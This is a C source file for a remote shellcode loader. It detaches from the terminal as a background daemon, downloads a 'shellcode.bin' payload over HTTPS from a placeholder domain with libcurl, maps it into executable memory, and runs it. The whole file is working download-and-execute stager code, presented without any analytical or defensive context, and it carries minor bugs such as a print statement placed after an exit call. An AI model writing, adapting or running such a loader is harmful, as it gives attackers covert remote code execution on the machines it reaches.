#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <curl/curl.h>

#define SHELLCODE_URL "https://<DOMAIN>/shellcode.bin"

void daemonize() {
    pid_t pid, sid;

    // First fork
    pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        exit(EXIT_SUCCESS);  // Parent exits
    }
    printf("After first fork. PID is %d\n", pid);

    // Child continues - now orphaned, adopted by init

    // Create new session
    sid = setsid();
    if (sid < 0) {
        exit(EXIT_FAILURE);
        printf("Exit beacuse SID failed. SID is %d\n", sid);
    }

    printf("After setsid. SID is %d\n", sid);
    // Second fork
    pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        exit(EXIT_SUCCESS);  // First child exits
    }
    printf("After second fork. PID is %d\n", pid);

    // Second child continues as daemon

    // Change working directory to root
    chdir("/");

    // Close file descriptors
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    // Set file creation mask
    umask(0);
    printf("Daemonize done.\n");
}


struct string {
    char *ptr;
    size_t len;
};

static size_t write_cb(void *data, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct string *s = userp;
    char *tmp = realloc(s->ptr, s->len + realsize + 1);
    if (!tmp) return 0;
    s->ptr = tmp;
    memcpy(s->ptr + s->len, data, realsize);
    s->len += realsize;
    s->ptr[s->len] = '\0';
    return realsize;
}

int main(int argc, char **argv)
{
    printf("Daemonizing\n");
    daemonize();
    printf("Daemonizing done in main\n");
    CURL *curl = curl_easy_init();
    printf("Got curl\n");
    if (!curl) return 1;

    struct string s = { .ptr = malloc(1), .len = 0 };
    s.ptr[0] = '\0';

    curl_easy_setopt(curl, CURLOPT_URL, SHELLCODE_URL);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);

    CURLcode res = curl_easy_perform(curl);

    void *exec = mmap(NULL, s.len, PROT_READ | PROT_WRITE | PROT_EXEC,
                       MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (exec == MAP_FAILED) {
        printf("MAP_FAILED\n");
        perror("mmap");
        return 1;
    }
    memcpy(exec, s.ptr, s.len);
    free(s.ptr);
    curl_easy_cleanup(curl);
    ((void(*)())exec)();
    return 0;
}
